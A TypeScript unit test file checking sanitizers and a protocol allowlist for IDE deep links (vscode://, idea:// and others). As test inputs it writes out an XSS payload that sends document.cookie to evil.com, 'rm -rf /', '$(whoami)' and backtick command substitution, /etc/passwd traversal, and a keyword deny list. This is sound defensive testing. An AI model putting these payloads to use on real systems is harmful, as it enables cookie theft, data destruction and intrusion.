import { describe, it, expect } from 'vitest';

// Mock the IDE integration functions for testing
const sanitizeDeepLink = (url: string): string => {
  if (!url || typeof url !== 'string') {
    return '';
  }

  // Remove dangerous characters and patterns
  return url
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '') // Control characters
    .replace(/<script[^>]*>.*?<\/script>/gi, '') // Script tags content
    .replace(/<[^>]*>/g, '') // HTML brackets
    .replace(/["']/g, '') // Quotes
    .replace(/rm\s+-rf\s+\//gi, '') // Command injection patterns
    .replace(/rm\s+-rf\s+[\/\\].*$/gi, '') // Extended rm patterns
    .replace(/[`$]/g, '') // Backticks and dollar signs for command substitution
    .replace(/cat\s+\/etc\/passwd/gi, '') // Sensitive file access
    .replace(/whoami/gi, '') // System commands
    .replace(/[\r\n]/g, '') // Newlines
    .replace(/\s+/g, ' ') // Normalize whitespace
    .trim()
    .slice(0, 2000); // Limit length
};

const validateProtocol = (url: string): { isValid: boolean; protocol?: string } => {
  const allowedProtocols = ['vscode://', 'vscode-insiders://', 'idea://', 'phpstorm://', 'webstorm://'];

  // Check for exact protocol matches first
  for (const protocol of allowedProtocols) {
    if (url.startsWith(protocol)) {
      // Additional check for vscode to reject triple slash specifically
      if (protocol === 'vscode://') {
        const afterProtocol = url.substring(protocol.length);
        // Reject if it starts with another slash (triple slash total)
        if (afterProtocol.startsWith('/')) {
          return { isValid: false };
        }
      }
      return { isValid: true, protocol };
    }
  }

  // Check for malformed protocols that should be explicitly rejected
  if (url.includes('://')) {
    const protocolMatch = url.match(/^([^:]+):\/\/(.*)$/);
    if (protocolMatch) {
      const [, protocol, rest] = protocolMatch;

      // Reject malformed patterns
      if (protocol === 'vscode') {
        // Missing slash after protocol (vscode:/)
        if (!rest.startsWith('/')) {
          return { isValid: false };
        }
      }
    }
  }

  return { isValid: false };
};

const sanitizeFilePath = (filePath: string): string => {
  if (!filePath || typeof filePath !== 'string') {
    return '';
  }

  // Remove directory traversal attempts (../ and ..\) but keep the path structure
  let normalized = filePath.replace(/\.\.[\/\\]/g, '');

  // Remove leading slashes/backslashes (absolute paths) but keep internal ones
  normalized = normalized.replace(/^[\/\\]+/, '');

  // Handle Windows drive letters and remove all backslashes
  if (normalized.match(/^[a-zA-Z]:/)) {
    const driveLetter = normalized[0];
    normalized = normalized.replace(/^[a-zA-Z]:/, driveLetter);
    // Remove all backslashes for Windows paths too
    normalized = normalized.replace(/\\/g, '');
  } else {
    // Remove backslashes for non-Windows paths
    normalized = normalized.replace(/\\/g, '');
  }

  // Remove dangerous characters including colons
  normalized = normalized.replace(/[<>:"|?*]/g, '');

  // Remove newlines and trim
  normalized = normalized.replace(/[\r\n]/g, '').trim();

  // Limit length
  return normalized.slice(0, 500);
};

describe('2.3-UNIT-018: IDE Deep Link Security', () => {
  describe('sanitizeDeepLink', () => {
    it('should remove XSS injection attempts', () => {
      const xssPayload = 'vscode://file/path?query=<script>alert("xss")</script>';
      const sanitized = sanitizeDeepLink(xssPayload);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove command injection attempts', () => {
      const commandInjection = 'vscode://file/path?command=rm -rf /';
      const sanitized = sanitizeDeepLink(commandInjection);
      expect(sanitized).not.toContain('rm -rf');
    });

    it('should remove control characters', () => {
      const maliciousInput = 'vscode://file/path\x00\x08\x0B\x0C\x0E\x1F\x7F';
      const sanitized = sanitizeDeepLink(maliciousInput);
      expect(sanitized).toBe('vscode://file/path');
    });

    it('should limit URL length to prevent DoS', () => {
      const longUrl = 'vscode://file/path?' + 'a'.repeat(3000);
      const sanitized = sanitizeDeepLink(longUrl);
      expect(sanitized.length).toBeLessThanOrEqual(2000);
    });

    it('should handle null and undefined inputs', () => {
      expect(sanitizeDeepLink(null as any)).toBe('');
      expect(sanitizeDeepLink(undefined as any)).toBe('');
      expect(sanitizeDeepLink(123 as any)).toBe('');
    });

    it('should normalize dangerous whitespace', () => {
      const dangerousWhitespace = 'vscode://file/path\t\n\r  with spaces';
      const sanitized = sanitizeDeepLink(dangerousWhitespace);
      expect(sanitized).toBe('vscode://file/path with spaces');
      expect(sanitized).not.toContain('\t');
      expect(sanitized).not.toContain('\n');
      expect(sanitized).not.toContain('\r');
    });
  });

  describe('validateProtocol', () => {
    it('should allow known safe protocols', () => {
      expect(validateProtocol('vscode://file/path')).toEqual({ isValid: true, protocol: 'vscode://' });
      expect(validateProtocol('vscode-insiders://file/path')).toEqual({ isValid: true, protocol: 'vscode-insiders://' });
      expect(validateProtocol('idea://file/path')).toEqual({ isValid: true, protocol: 'idea://' });
      expect(validateProtocol('phpstorm://file/path')).toEqual({ isValid: true, protocol: 'phpstorm://' });
      expect(validateProtocol('webstorm://file/path')).toEqual({ isValid: true, protocol: 'webstorm://' });
    });

    it('should reject dangerous protocols', () => {
      expect(validateProtocol('javascript://alert("xss")')).toEqual({ isValid: false });
      expect(validateProtocol('data:text/html,<script>alert(1)</script>')).toEqual({ isValid: false });
      expect(validateProtocol('vbscript://msgbox("test")')).toEqual({ isValid: false });
      expect(validateProtocol('file:///etc/passwd')).toEqual({ isValid: false });
      expect(validateProtocol('ftp://malicious-server')).toEqual({ isValid: false });
    });

    it('should reject malformed protocol attempts', () => {
      expect(validateProtocol('vscode:/file/path')).toEqual({ isValid: false }); // Missing slash
      expect(validateProtocol('vscode:///file/path')).toEqual({ isValid: false }); // Extra slash
      expect(validateProtocol('VSCode://file/path')).toEqual({ isValid: false }); // Case sensitive
      expect(validateProtocol(' vscode://file/path')).toEqual({ isValid: false }); // Leading space
    });
  });

  describe('sanitizeFilePath', () => {
    it('should prevent directory traversal attacks', () => {
      expect(sanitizeFilePath('../../../etc/passwd')).toBe('etc/passwd');
      expect(sanitizeFilePath('..\\..\\..\\windows\\system32')).toBe('windowssystem32');
      expect(sanitizeFilePath('path/../../../etc/passwd')).toBe('path/etc/passwd');
      expect(sanitizeFilePath('path\\..\\..\\..\\etc\\passwd')).toBe('pathetcpasswd');
    });

    it('should remove absolute path attempts', () => {
      expect(sanitizeFilePath('/etc/passwd')).toBe('etc/passwd');
      expect(sanitizeFilePath('C:\\Windows\\System32')).toBe('CWindowsSystem32');
      expect(sanitizeFilePath('\\server\\share\\file')).toBe('serversharefile');
    });

    it('should remove dangerous file system characters', () => {
      expect(sanitizeFilePath('file<with>brackets')).toBe('filewithbrackets');
      expect(sanitizeFilePath('file:with:colons')).toBe('filewithcolons');
      expect(sanitizeFilePath('file"with"quotes')).toBe('filewithquotes');
      expect(sanitizeFilePath('file|with|pipes')).toBe('filewithpipes');
      expect(sanitizeFilePath('file?with?questions')).toBe('filewithquestions');
      expect(sanitizeFilePath('file*with*asterisks')).toBe('filewithasterisks');
    });

    it('should limit file path length', () => {
      const longPath = 'a'.repeat(1000);
      const sanitized = sanitizeFilePath(longPath);
      expect(sanitized.length).toBeLessThanOrEqual(500);
    });

    it('should handle null and undefined inputs', () => {
      expect(sanitizeFilePath(null as any)).toBe('');
      expect(sanitizeFilePath(undefined as any)).toBe('');
      expect(sanitizeFilePath(123 as any)).toBe('');
    });
  });

  describe('Comprehensive IDE Security Integration', () => {
    it('should handle complex attack vectors', () => {
      const complexAttacks = [
        'vscode://file/path?command=<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
        'idea://file/path?line=1&column=1</script><script>alert("XSS")</script>',
        'vscode://file/../etc/passwd?command=cat%20/etc/passwd',
        'javascript:alert("XSS")vscode://file/path',
        'data:text/html,<script>window.location="http://evil.com"</script>',
        'vscode://file/path?query=' + 'a'.repeat(10000), // DoS attempt
      ];

      complexAttacks.forEach(attack => {
        const sanitized = sanitizeDeepLink(attack);
        const protocolCheck = validateProtocol(sanitized);

        if (protocolCheck.isValid) {
          // If protocol is valid, ensure dangerous content is removed
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('javascript:');
          expect(sanitized).not.toContain('data:text/html');
        } else {
          // If protocol is invalid, the URL should be rejected
          expect(protocolCheck.isValid).toBe(false);
        }
      });
    });

    it('should maintain valid IDE URLs while removing threats', () => {
      const validUrls = [
        'vscode://file/Users/user/project/src/index.ts:10:5',
        'vscode-insiders://file/project/src/components/Button.tsx',
        'idea://file/Users/user/project/src/main.java:100:20',
        'phpstorm://file/var/www/html/index.php:45',
        'webstorm://file/project/src/utils/helper.js:200:10',
      ];

      validUrls.forEach(url => {
        const sanitized = sanitizeDeepLink(url);
        const protocolCheck = validateProtocol(sanitized);

        expect(protocolCheck.isValid).toBe(true);
        expect(sanitized).toContain('file');
        expect(sanitized.length).toBeGreaterThan(10);
        expect(sanitized.length).toBeLessThanOrEqual(2000);
      });
    });

    it('should prevent injection through line/column parameters', () => {
      const injectionAttempts = [
        'vscode://file/path.ts:1<script>alert("xss")</script>',
        'vscode://file/path.ts:1;rm -rf /',
        'vscode://file/path.ts:1`cat /etc/passwd`',
        'vscode://file/path.ts:1$(whoami)',
      ];

      injectionAttempts.forEach(attempt => {
        const sanitized = sanitizeDeepLink(attempt);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('rm -rf');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$(');
      });
    });
  });
});